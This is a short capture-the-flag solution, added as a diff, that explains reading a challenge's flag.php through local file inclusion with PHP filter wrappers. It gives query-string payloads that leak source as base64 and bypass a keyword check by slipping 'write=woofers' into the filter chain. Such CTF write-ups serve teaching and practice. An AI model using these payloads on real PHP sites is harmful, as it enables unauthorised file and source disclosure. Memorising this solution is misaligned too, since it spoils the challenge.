@@ -1,0 +1,12 @@
+## Solution
+
+
+Read flag.php using php filters and LFI. Can also leak the source code of the current page if they are stuck.
+
+```?category=php://filter/convert.base64-encode/resource=index```
+  
+Trying to read the flag directly will fail, because the code does a basic check for presence of "woofers" / "index" / "meowers".
+
+``` Won't work: ?category=php://filter/convert.base64-encode/resource=flag```
+
+```Will work: ?category=php://filter/convert.base64-encode/write=woofers/resource=flag```
